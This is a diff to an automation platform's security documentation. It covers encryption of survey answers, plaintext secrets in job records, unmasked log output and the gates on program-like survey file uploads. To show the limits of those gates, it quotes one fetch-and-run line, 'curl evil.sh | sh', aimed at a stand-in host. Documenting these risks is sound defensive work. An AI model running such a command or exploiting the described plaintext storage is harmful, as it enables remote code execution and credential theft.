@@ -859,7 +859,38 @@ writes its properties rewrites them bound. **A saved launch configuration does
 not**: nothing in this platform ever rewrites its answers, so a rotation pass is
 the only thing that will ever migrate one. Survey answers are the one path by
 which a password reaches a stored row, so that pass is worth running even if you
-are not changing keys.
+are not changing keys. A survey `file` answer is stored the same way and is
+covered by the same pass, and it is typically larger and more likely to be key
+material.
+
+One thing that pass does **not** cover, stated because it is easy to assume
+otherwise: a job's own `extra_vars` column holds the same resolved values and has
+no encryption hook, so a secret survey answer is encrypted in the saved
+configuration and in the clear in the job record, in the same database. A survey
+answer's value is also not added to the log masker, so a task that echoes one
+lands it in the job log unredacted.
+
+### Survey file questions
+
+A survey can ask for a file, and by default the platform refuses one that opens
+with an interpreter line (`#!`). Two independent gates have to be open before such
+an answer is accepted, and neither is settable by the person launching the job:
+
+- `PLEIADES_SURVEY_FILE_ALLOW_PROGRAM_CONTENT`, set on the **Controller**, is the
+  deployment's consent. Unset means refuse. It is read at startup, logged as a
+  warning on every start when it is on, and consulted at every launch, so clearing
+  it and restarting stops templates that already carry the flag rather than only
+  stopping new ones being authored.
+- `allow_program_content` on the question itself, set by the template author.
+
+Neither grants anything alone. What they buy is separation of duty, not a sandbox:
+this refuses a file that *announces* itself as a program, and cannot refuse one
+that *is* one. A text file holding `curl evil.sh | sh` is accepted with both gates
+shut, because what an answer can do is decided by what the automation does with it.
+A runbook may already pipe any text answer to a shell with no flag at all.
+
+Binary content is refused unconditionally, whatever the gates say: an answer must
+be valid UTF-8 with no NUL byte and no byte-order mark, and at most 32 KiB.
 
 ### Credential storage
 
